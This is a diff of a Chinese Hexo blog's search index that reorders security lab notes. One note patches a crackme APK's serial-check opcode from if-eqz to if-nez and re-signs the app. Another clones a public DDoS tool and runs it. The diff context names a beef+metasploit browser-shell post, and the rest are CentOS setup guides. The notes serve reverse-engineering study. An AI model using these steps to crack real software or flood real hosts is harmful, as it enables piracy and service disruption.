@@ -1,46 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>APK静态分析</title>
-    <url>/2021/12/28/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<h2 id="APK静态分析"><a href="#APK静态分析" class="headerlink" title="APK静态分析"></a>APK静态分析</h2><p>目的：</p>
-<ul>
-<li>了解APK（DEX）静态分析的基本步骤</li>
-<li>掌握使用IDApro辅助进行静态分析的方法</li>
-</ul>
-<p>原理：</p>
-<ul>
-<li>程序静态分析（Program Static Analysis）是指在不运行代码的方式下，通过词法分析、语法分析、控制流、数据流分析等技术对程序代码进行扫描，验证代码是否满足规范性、安全性、可靠性、可维护性等指标的一种代码分析技术。目前静态分析技术向模拟执行的技术发展以能够发现更多传统意义上动态测试才能发现的缺陷，例如符号执行、抽象解释、值依赖分析等等并采用数学约束求解工具进行路径约减或者可达性分析以减少误报增加效率。</li>
-<li>Smali，Baksmali分别是指安卓系统里的Java虚拟机（Dalvik）所使用的一种.dex格式文件的汇编器，反汇编器。</li>
-</ul>
-<p>过程：</p>
-<p>使用解压软件打开crackme0502.apk,解压出classes.dex，打开IDApro并将classes.dex拖入到IDA中<img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105021723.png" alt="image-20211229105021723"></p>
-<p>导入结构化文件，点击file-script file，然后选择dex.idc文件，确定<img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105052129.png" alt="image-20211229105052129"></p>
-<p>按ALT+Q，可以看到DEX文件的结构，选择某一项点击确定，可以跳到相应字段的起始位置<img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105232030.png" alt="image-20211229105232030"></p>
-<p>打开eclipse，启动SimpleEdu45虚拟机，并在SimpleEdu45目录下运行命令adb install crackme0502.apk<img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105658041.png" alt="image-20211229105658041"></p>
-<p>打开crackeme0502，点击“获取注解”按钮<img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105844377.png" alt="image-20211229105844377"></p>
-<p>打开crackme0502，点击“检测注册码”按钮<img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105858622.png" alt="image-20211229105858622"></p>
-<p>切换回IDA pro，切换至Exports选项卡。程序运行的主Activity一般叫MainActivity，所以按住ctrl+f，键入Main，可以发现MainActivity中有两个内部类都有OnClick()方法。<img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110001643.png" alt="image-20211229110001643"></p>
-<p>分别双击MainActivity$1.onClick@VL和MainActivity$2.onClick@VL来查看对应的方法实现，通过对比，可以发现后者的方法创建了名为SNChecker的一个对象，故序列号检查功能应该在MainActivity$​2.onClick@VL中。</p>
-<p>MainActivity$1.onClick@VL <img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110055781.png" alt="image-20211229110055781"></p>
-<p>MainActivity$2.onClick@VL <img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110114049.png" alt="image-20211229110114049"></p>
-<p>按空格键将IDA切换至“流程视图”<img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110629336.png" alt="image-20211229110629336"></p>
-<p>很明显可以看出，红色的线是不满足条件所跳转到的语句，绿色的是满足条件时的跳转。所以把if-eqz换成if-nez就有可能破解成功。故将光标定位值if-eqz一行<img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110655907.png" alt="image-20211229110655907"></p>
-<p>然后切换至HEX-view 1选项卡<img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110748059.png" alt="image-20211229110748059"></p>
-<p>关闭IDA，右键使用UltraEdit工具打开classes.dex，按CTRL+F搜索38020F00（有多个38020F00，注意起始地址是否为002D0B0，如下图所示）。由于if-nez的Opcode为39，故将38改为39，然后保存该文件（点击右上角切为16进制显示模式）<img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111128616.png" alt="image-20211229111128616"></p>
-<p>ctrl+f寻找,将38改为39</p>
-<p>运行DexFixer.exe，将保存好的DEX文件拖进窗口中，进行Header的Checksum修复<img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111244001.png" alt="image-20211229111244001"></p>
-<p>把classes.dex重新添加至apk文件（使用360压缩打开apk文件将class.dex替换即可），并运行命令signapk crackme0502.apk重新签名<img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111424498.png" alt="image-20211229111424498"></p>
-<p>并把生成的signed.apk按着之前的方法重新安装至虚拟机中（需要先将之前安装的程序卸载）adb install signed.apk。注意是signed.apk。再次点击下面的按钮，发现软件提示已注册。</p>
-<p><img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111717277.png" alt="image-20211229111717277"></p>
-]]></content>
-      <tags>
-        <tag>APK</tag>
-        <tag>逆向</tag>
-        <tag>IDA</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>APP加壳</title>
     <url>/2021/12/27/APP%E5%8A%A0%E5%A3%B3/</url>
     <content><![CDATA[<h2 id="APP加壳"><a href="#APP加壳" class="headerlink" title="APP加壳"></a>APP加壳</h2><p>目的：</p>
@@ -85,6 +45,58 @@
       </tags>
   </entry>
   <entry>
+    <title>APK静态分析</title>
+    <url>/2021/12/28/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h2 id="APK静态分析"><a href="#APK静态分析" class="headerlink" title="APK静态分析"></a>APK静态分析</h2><p>目的：</p>
+<ul>
+<li>了解APK（DEX）静态分析的基本步骤</li>
+<li>掌握使用IDApro辅助进行静态分析的方法</li>
+</ul>
+<p>原理：</p>
+<ul>
+<li>程序静态分析（Program Static Analysis）是指在不运行代码的方式下，通过词法分析、语法分析、控制流、数据流分析等技术对程序代码进行扫描，验证代码是否满足规范性、安全性、可靠性、可维护性等指标的一种代码分析技术。目前静态分析技术向模拟执行的技术发展以能够发现更多传统意义上动态测试才能发现的缺陷，例如符号执行、抽象解释、值依赖分析等等并采用数学约束求解工具进行路径约减或者可达性分析以减少误报增加效率。</li>
+<li>Smali，Baksmali分别是指安卓系统里的Java虚拟机（Dalvik）所使用的一种.dex格式文件的汇编器，反汇编器。</li>
+</ul>
+<p>过程：</p>
+<p>使用解压软件打开crackme0502.apk,解压出classes.dex，打开IDApro并将classes.dex拖入到IDA中<img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105021723.png" alt="image-20211229105021723"></p>
+<p>导入结构化文件，点击file-script file，然后选择dex.idc文件，确定<img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105052129.png" alt="image-20211229105052129"></p>
+<p>按ALT+Q，可以看到DEX文件的结构，选择某一项点击确定，可以跳到相应字段的起始位置<img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105232030.png" alt="image-20211229105232030"></p>
+<p>打开eclipse，启动SimpleEdu45虚拟机，并在SimpleEdu45目录下运行命令adb install crackme0502.apk<img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105658041.png" alt="image-20211229105658041"></p>
+<p>打开crackeme0502，点击“获取注解”按钮<img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105844377.png" alt="image-20211229105844377"></p>
+<p>打开crackme0502，点击“检测注册码”按钮<img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105858622.png" alt="image-20211229105858622"></p>
+<p>切换回IDA pro，切换至Exports选项卡。程序运行的主Activity一般叫MainActivity，所以按住ctrl+f，键入Main，可以发现MainActivity中有两个内部类都有OnClick()方法。<img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110001643.png" alt="image-20211229110001643"></p>
+<p>分别双击MainActivity$1.onClick@VL和MainActivity$2.onClick@VL来查看对应的方法实现，通过对比，可以发现后者的方法创建了名为SNChecker的一个对象，故序列号检查功能应该在MainActivity$​2.onClick@VL中。</p>
+<p>MainActivity$1.onClick@VL <img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110055781.png" alt="image-20211229110055781"></p>
+<p>MainActivity$2.onClick@VL <img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110114049.png" alt="image-20211229110114049"></p>
+<p>按空格键将IDA切换至“流程视图”<img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110629336.png" alt="image-20211229110629336"></p>
+<p>很明显可以看出，红色的线是不满足条件所跳转到的语句，绿色的是满足条件时的跳转。所以把if-eqz换成if-nez就有可能破解成功。故将光标定位值if-eqz一行<img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110655907.png" alt="image-20211229110655907"></p>
+<p>然后切换至HEX-view 1选项卡<img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110748059.png" alt="image-20211229110748059"></p>
+<p>关闭IDA，右键使用UltraEdit工具打开classes.dex，按CTRL+F搜索38020F00（有多个38020F00，注意起始地址是否为002D0B0，如下图所示）。由于if-nez的Opcode为39，故将38改为39，然后保存该文件（点击右上角切为16进制显示模式）<img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111128616.png" alt="image-20211229111128616"></p>
+<p>ctrl+f寻找,将38改为39</p>
+<p>运行DexFixer.exe，将保存好的DEX文件拖进窗口中，进行Header的Checksum修复<img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111244001.png" alt="image-20211229111244001"></p>
+<p>把classes.dex重新添加至apk文件（使用360压缩打开apk文件将class.dex替换即可），并运行命令signapk crackme0502.apk重新签名<img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111424498.png" alt="image-20211229111424498"></p>
+<p>并把生成的signed.apk按着之前的方法重新安装至虚拟机中（需要先将之前安装的程序卸载）adb install signed.apk。注意是signed.apk。再次点击下面的按钮，发现软件提示已注册。</p>
+<p><img src="http://121.5.125.62/image/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111717277.png" alt="image-20211229111717277"></p>
+]]></content>
+      <tags>
+        <tag>APK</tag>
+        <tag>逆向</tag>
+        <tag>IDA</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DDos攻击</title>
+    <url>/2021/11/24/DDos%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<h2 id="DDos攻击"><a href="#DDos攻击" class="headerlink" title="DDos攻击"></a>DDos攻击</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/Ha3MrX/DDOs-Attack   # 下载工具</span><br><span class="line">vim ddos-attack.py</span><br><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/python2</span></span><br><span class="line">chmod +777 ddos-attack.py #直接使用</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>ddos</tag>
+        <tag>python</tag>
+        <tag>kali</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Android安全之短信欺诈漏洞</title>
     <url>/2021/12/27/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<p>目的：</p>
@@ -123,18 +135,6 @@
         <tag>Android</tag>
         <tag>短信</tag>
         <tag>欺诈</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DDos攻击</title>
-    <url>/2021/11/24/DDos%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<h2 id="DDos攻击"><a href="#DDos攻击" class="headerlink" title="DDos攻击"></a>DDos攻击</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/Ha3MrX/DDOs-Attack   # 下载工具</span><br><span class="line">vim ddos-attack.py</span><br><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/python2</span></span><br><span class="line">chmod +777 ddos-attack.py #直接使用</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>ddos</tag>
-        <tag>python</tag>
-        <tag>kali</tag>
       </tags>
   </entry>
   <entry>
@@ -398,6 +398,31 @@
       </tags>
   </entry>
   <entry>
+    <title>centos7安装apache</title>
+    <url>/2021/11/24/centos7%E5%AE%89%E8%A3%85apache/</url>
+    <content><![CDATA[<h2 id="centos7-安装Apache"><a href="#centos7-安装Apache" class="headerlink" title="centos7 安装Apache"></a>centos7 安装Apache</h2><h3 id="实验准备：vmware上安装的centos7"><a href="#实验准备：vmware上安装的centos7" class="headerlink" title="实验准备：vmware上安装的centos7"></a>实验准备：vmware上安装的centos7</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> uname -a</span></span><br><span class="line">Linux cn7 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> cat /etc/redhat-release</span></span><br><span class="line">CentOS Linux release 7.9.2009 (Core)</span><br></pre></td></tr></table></figure>
+
+<h3 id="安装Apache："><a href="#安装Apache：" class="headerlink" title="安装Apache："></a>安装Apache：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install httpd</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="查看http状态："><a href="#查看http状态：" class="headerlink" title="查看http状态："></a>查看http状态：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl status httpd</span></span><br><span class="line">● httpd.service - The Apache HTTP Server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/httpd.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: inactive (dead)</span><br><span class="line">     Docs: man:httpd(8)</span><br><span class="line">           man:apachectl(8)</span><br></pre></td></tr></table></figure>
+
+<h3 id="启动Apache并设置为开机启动："><a href="#启动Apache并设置为开机启动：" class="headerlink" title="启动Apache并设置为开机启动："></a>启动Apache并设置为开机启动：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl start httpd</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl <span class="built_in">enable</span> httpd</span></span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/httpd.service to /usr/lib/systemd/system/httpd.service.</span><br></pre></td></tr></table></figure>
+
+<h3 id="再次查看Apache状态："><a href="#再次查看Apache状态：" class="headerlink" title="再次查看Apache状态："></a>再次查看Apache状态：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl status httpd</span></span><br><span class="line">● httpd.service - The Apache HTTP Server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/httpd.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since 六 2021-08-28 21:28:05 CST; 1min 17s ago</span><br><span class="line">     Docs: man:httpd(8)</span><br><span class="line">           man:apachectl(8)</span><br><span class="line"> Main PID: 1358 (httpd)</span><br><span class="line">   Status: &quot;Total requests: 0; Current requests/sec: 0; Current traffic:   0 B/sec&quot;</span><br><span class="line">   CGroup: /system.slice/httpd.service</span><br><span class="line">           ├─1358 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1359 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1360 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1361 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1362 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           └─1363 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line"></span><br><span class="line">8月 28 21:27:34 cn7 systemd[1]: Starting The Apache HTTP Server...</span><br><span class="line">8月 28 21:27:54 cn7 httpd[1358]: AH00558: httpd: Could not reliably determine the server&#x27;s fully qualified dom...essage</span><br><span class="line">8月 28 21:28:05 cn7 systemd[1]: Started The Apache HTTP Server.</span><br><span class="line">Hint: Some lines were ellipsized, use -l to show in full.</span><br></pre></td></tr></table></figure>
+
+<h3 id="查看Apache版本"><a href="#查看Apache版本" class="headerlink" title="查看Apache版本"></a>查看Apache版本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> httpd -v</span></span><br><span class="line">Server version: Apache/2.4.6 (CentOS)</span><br><span class="line">Server built:   Nov 16 2020 16:18:20</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用ss查看端口监听状态"><a href="#使用ss查看端口监听状态" class="headerlink" title="使用ss查看端口监听状态"></a>使用ss查看端口监听状态</h3><p>（ss -tnl     [t：tcp,n：数字显示,l：监听]）</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> ss -tnl</span></span><br><span class="line">State      Recv-Q Send-Q               Local Address:Port                              Peer Address:Port</span><br><span class="line">LISTEN     0      128                              *:22                                           *:*</span><br><span class="line">LISTEN     0      100                      127.0.0.1:25                                           *:*</span><br><span class="line">LISTEN     0      128                           [::]:22                                        [::]:*</span><br><span class="line">LISTEN     0      100                          [::1]:25                                        [::]:*</span><br><span class="line">LISTEN     0      128                           [::]:80                                        [::]:*</span><br></pre></td></tr></table></figure>
+
+<h3 id="访问虚拟机的ip地址"><a href="#访问虚拟机的ip地址" class="headerlink" title="访问虚拟机的ip地址"></a>访问虚拟机的ip地址</h3><p>如果能访问即成功。</p>
+]]></content>
+      <tags>
+        <tag>apache</tag>
+        <tag>centos7</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>beef+metasploit利用浏览器获取shell</title>
     <url>/2021/12/20/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/</url>
     <content><![CDATA[<h2 id="beef-metasploit利用浏览器获取shell"><a href="#beef-metasploit利用浏览器获取shell" class="headerlink" title="beef+metasploit利用浏览器获取shell"></a>beef+metasploit利用浏览器获取shell</h2><h3 id="利用beef获得目标主机shell"><a href="#利用beef获得目标主机shell" class="headerlink" title="利用beef获得目标主机shell"></a>利用beef获得目标主机shell</h3><h4 id="原理：beef是一个用于合法研究和测试目的的专业浏览器漏洞利用框架。它允许有经验的渗透测试人员或系统管理员对目标进行攻击测试。攻击成功以后会加载浏览器劫持会话。BEEF可以利用XSS跨站脚本漏洞。"><a href="#原理：beef是一个用于合法研究和测试目的的专业浏览器漏洞利用框架。它允许有经验的渗透测试人员或系统管理员对目标进行攻击测试。攻击成功以后会加载浏览器劫持会话。BEEF可以利用XSS跨站脚本漏洞。" class="headerlink" title="原理：beef是一个用于合法研究和测试目的的专业浏览器漏洞利用框架。它允许有经验的渗透测试人员或系统管理员对目标进行攻击测试。攻击成功以后会加载浏览器劫持会话。BEEF可以利用XSS跨站脚本漏洞。"></a>原理：beef是一个用于合法研究和测试目的的专业浏览器漏洞利用框架。它允许有经验的渗透测试人员或系统管理员对目标进行攻击测试。攻击成功以后会加载浏览器劫持会话。BEEF可以利用XSS跨站脚本漏洞。</h4><h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>打开终端，将beef和metasploit进行关联，终端进入<code>beef-xss</code>目录，编辑文件<code>config.yaml</code></p>
@@ -451,31 +476,6 @@
       </tags>
   </entry>
   <entry>
-    <title>centos7安装apache</title>
-    <url>/2021/11/24/centos7%E5%AE%89%E8%A3%85apache/</url>
-    <content><![CDATA[<h2 id="centos7-安装Apache"><a href="#centos7-安装Apache" class="headerlink" title="centos7 安装Apache"></a>centos7 安装Apache</h2><h3 id="实验准备：vmware上安装的centos7"><a href="#实验准备：vmware上安装的centos7" class="headerlink" title="实验准备：vmware上安装的centos7"></a>实验准备：vmware上安装的centos7</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> uname -a</span></span><br><span class="line">Linux cn7 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> cat /etc/redhat-release</span></span><br><span class="line">CentOS Linux release 7.9.2009 (Core)</span><br></pre></td></tr></table></figure>
-
-<h3 id="安装Apache："><a href="#安装Apache：" class="headerlink" title="安装Apache："></a>安装Apache：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install httpd</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="查看http状态："><a href="#查看http状态：" class="headerlink" title="查看http状态："></a>查看http状态：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl status httpd</span></span><br><span class="line">● httpd.service - The Apache HTTP Server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/httpd.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: inactive (dead)</span><br><span class="line">     Docs: man:httpd(8)</span><br><span class="line">           man:apachectl(8)</span><br></pre></td></tr></table></figure>
-
-<h3 id="启动Apache并设置为开机启动："><a href="#启动Apache并设置为开机启动：" class="headerlink" title="启动Apache并设置为开机启动："></a>启动Apache并设置为开机启动：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl start httpd</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl <span class="built_in">enable</span> httpd</span></span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/httpd.service to /usr/lib/systemd/system/httpd.service.</span><br></pre></td></tr></table></figure>
-
-<h3 id="再次查看Apache状态："><a href="#再次查看Apache状态：" class="headerlink" title="再次查看Apache状态："></a>再次查看Apache状态：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl status httpd</span></span><br><span class="line">● httpd.service - The Apache HTTP Server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/httpd.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since 六 2021-08-28 21:28:05 CST; 1min 17s ago</span><br><span class="line">     Docs: man:httpd(8)</span><br><span class="line">           man:apachectl(8)</span><br><span class="line"> Main PID: 1358 (httpd)</span><br><span class="line">   Status: &quot;Total requests: 0; Current requests/sec: 0; Current traffic:   0 B/sec&quot;</span><br><span class="line">   CGroup: /system.slice/httpd.service</span><br><span class="line">           ├─1358 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1359 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1360 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1361 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1362 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           └─1363 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line"></span><br><span class="line">8月 28 21:27:34 cn7 systemd[1]: Starting The Apache HTTP Server...</span><br><span class="line">8月 28 21:27:54 cn7 httpd[1358]: AH00558: httpd: Could not reliably determine the server&#x27;s fully qualified dom...essage</span><br><span class="line">8月 28 21:28:05 cn7 systemd[1]: Started The Apache HTTP Server.</span><br><span class="line">Hint: Some lines were ellipsized, use -l to show in full.</span><br></pre></td></tr></table></figure>
-
-<h3 id="查看Apache版本"><a href="#查看Apache版本" class="headerlink" title="查看Apache版本"></a>查看Apache版本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> httpd -v</span></span><br><span class="line">Server version: Apache/2.4.6 (CentOS)</span><br><span class="line">Server built:   Nov 16 2020 16:18:20</span><br></pre></td></tr></table></figure>
-
-<h3 id="使用ss查看端口监听状态"><a href="#使用ss查看端口监听状态" class="headerlink" title="使用ss查看端口监听状态"></a>使用ss查看端口监听状态</h3><p>（ss -tnl     [t：tcp,n：数字显示,l：监听]）</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> ss -tnl</span></span><br><span class="line">State      Recv-Q Send-Q               Local Address:Port                              Peer Address:Port</span><br><span class="line">LISTEN     0      128                              *:22                                           *:*</span><br><span class="line">LISTEN     0      100                      127.0.0.1:25                                           *:*</span><br><span class="line">LISTEN     0      128                           [::]:22                                        [::]:*</span><br><span class="line">LISTEN     0      100                          [::1]:25                                        [::]:*</span><br><span class="line">LISTEN     0      128                           [::]:80                                        [::]:*</span><br></pre></td></tr></table></figure>
-
-<h3 id="访问虚拟机的ip地址"><a href="#访问虚拟机的ip地址" class="headerlink" title="访问虚拟机的ip地址"></a>访问虚拟机的ip地址</h3><p>如果能访问即成功。</p>
-]]></content>
-      <tags>
-        <tag>apache</tag>
-        <tag>centos7</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>centos7安装mariadb</title>
     <url>/2021/11/24/centos7%E5%AE%89%E8%A3%85mariadb/</url>
     <content><![CDATA[<h2 id="centos7安装mariadb"><a href="#centos7安装mariadb" class="headerlink" title="centos7安装mariadb"></a>centos7安装mariadb</h2><p>mariadb是MYSQL的一个分支，语法基本和mysql一样，而且兼容mysql，centos7中自带了mariadb的软件包。</p>
@@ -493,29 +493,6 @@
       <tags>
         <tag>centos7</tag>
         <tag>mariadb</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>centos7安装php</title>
-    <url>/2021/11/24/centos7%E5%AE%89%E8%A3%85php/</url>
-    <content><![CDATA[<h2 id="centos7安装php"><a href="#centos7安装php" class="headerlink" title="centos7安装php"></a>centos7安装php</h2><p>环境是apache2+mariadb+php</p>
-<p>先安装php</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install php</span></span><br></pre></td></tr></table></figure>
-
-<p>安装php相关组件</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install php-mysql php-gd php-ldap php-odbc php-pear php-xml php-xmlrpc php-mbstring php-bcmath php-mhash</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl restart mariadb</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl restart httpd</span></span><br></pre></td></tr></table></figure>
-
-<p>通过php -v 查看信息</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/var/www/html#</span><span class="bash"> php -v</span></span><br><span class="line">PHP 5.4.16 (cli) (built: Apr  1 2020 04:07:17)</span><br><span class="line">Copyright (c) 1997-2013 The PHP Group</span><br><span class="line">Zend Engine v2.4.0, Copyright (c) 1998-2013 Zend Technologies</span><br></pre></td></tr></table></figure>
-
-<p>进入/var/www/html目录编写一个测试页面</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/var/www/html#</span><span class="bash"> vim index.php</span></span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>最后访问页面，有php相关信息成功</p>
-]]></content>
-      <tags>
-        <tag>centos7</tag>
-        <tag>php</tag>
       </tags>
   </entry>
   <entry>
@@ -564,17 +541,6 @@
       </tags>
   </entry>
   <entry>
-    <title>first-blog</title>
-    <url>/2021/11/24/first-blog/</url>
-    <content><![CDATA[<h2 id="Test-for-my-first-blog"><a href="#Test-for-my-first-blog" class="headerlink" title="Test for my first blog"></a>Test for my first blog</h2><p>这是正文。</p>
-<p><img src="/2021/11/24/first-blog/image-20211124165347049.png"></p>
-<p>11</p>
-]]></content>
-      <tags>
-        <tag>test</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>eNSP配置</title>
     <url>/2022/07/26/eNSP%E9%85%8D%E7%BD%AE/</url>
